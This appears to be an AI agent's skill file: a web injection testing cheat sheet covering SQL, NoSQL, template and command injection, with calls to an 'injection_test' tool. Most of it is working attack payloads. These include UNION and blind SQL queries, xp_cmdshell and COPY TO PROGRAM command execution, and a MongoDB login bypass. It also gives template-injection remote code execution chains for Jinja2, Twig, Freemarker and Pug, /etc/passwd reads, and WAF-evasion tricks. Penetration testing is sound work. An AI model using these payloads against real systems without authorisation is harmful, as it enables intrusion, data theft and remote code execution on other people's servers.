---
name: web-injection
description: SQL injection, NoSQL injection, SSTI, and command injection testing techniques
---

# Web Injection Testing Guide

## SQL Injection

### Detection
1. Single quote test: `'` → look for SQL error messages
2. Boolean-based: `AND 1=1` vs `AND 1=2` → compare response lengths
3. Time-based: `AND SLEEP(5)` → measure response delay
4. Error-based: `AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))` → data in errors

### DBMS-Specific Payloads

**MySQL**
- Version: `SELECT VERSION()`
- Current DB: `SELECT DATABASE()`
- Tables: `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()`
- UNION: `UNION SELECT NULL,NULL,table_name FROM information_schema.tables--`
- Time blind: `AND IF(1=1,SLEEP(5),0)`

**PostgreSQL**
- Version: `SELECT version()`
- Current DB: `SELECT current_database()`
- Tables: `SELECT tablename FROM pg_tables WHERE schemaname='public'`
- Stacked queries: `; SELECT pg_sleep(5)--`
- File read: `COPY (SELECT '') TO PROGRAM 'cmd'`

**MSSQL**
- Version: `SELECT @@VERSION`
- Current DB: `SELECT DB_NAME()`
- Tables: `SELECT name FROM sysobjects WHERE xtype='U'`
- Stacked: `; WAITFOR DELAY '0:0:5'--`
- xp_cmdshell: `; EXEC xp_cmdshell 'whoami'--`

**SQLite**
- Version: `SELECT sqlite_version()`
- Tables: `SELECT name FROM sqlite_master WHERE type='table'`

### WAF Evasion
- Case variation: `SeLeCt`, `UnIoN`
- Comment injection: `UN/**/ION SE/**/LECT`
- URL encoding: `%27` for `'`, `%20` for space
- Double encoding: `%2527` for `'`
- Alternative syntax: `||` for string concat, `LIKE` instead of `=`

### tool usage
```
injection_test target=<url> params=<param_name> type=sqli
```

## NoSQL Injection

### MongoDB
- Auth bypass: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
- Regex extraction: `{"username": "admin", "password": {"$regex": "^a"}}`
- Where clause: `{"$where": "this.password.match(/^a/)"}`
- Operator injection: `username[$ne]=&password[$ne]=`

### Detection
1. JSON body: inject `{"$gt": ""}` in string fields
2. Query string: `param[$ne]=value`
3. Error messages mentioning MongoDB, Mongoose
4. Unexpected data types accepted (objects instead of strings)

## Server-Side Template Injection (SSTI)

### Detection Polyglot
```
{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}
```
If any returns `49`, template injection exists.

### Engine-Specific

**Jinja2 (Python)**
- Detect: `{{7*'7'}}` → `7777777`
- RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

**Twig (PHP)**
- Detect: `{{7*'7'}}` → `49`
- RCE: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`

**Freemarker (Java)**
- Detect: `${7*7}` → `49`
- RCE: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

**Pug/Jade (Node.js)**
- Detect: `#{7*7}` → `49`
- RCE: `-var x = root.process.mainModule.require('child_process').execSync('id');`

## Command Injection

### Detection
1. Time-based: `; sleep 5`, `| sleep 5`, `` `sleep 5` ``
2. DNS-based: `; nslookup <oob-domain>`, `$(nslookup <oob-domain>)`
3. Error-based: `; cat /etc/passwd`, `| whoami`

### Bypass Techniques
- Space bypass: `{cat,/etc/passwd}`, `cat${IFS}/etc/passwd`
- Semicolon bypass: `%0a`, `\n`, `||`, `&&`
- Backtick substitution: `` `whoami` ``
- Dollar substitution: `$(whoami)`
- Wildcard: `/???/??t /???/p??s??`

### Platform Detection
- Linux: `; id`, `; uname -a`
- Windows: `& whoami`, `| dir`

### tool usage
```
injection_test target=<url> params=<param_name> type=cmdi
```
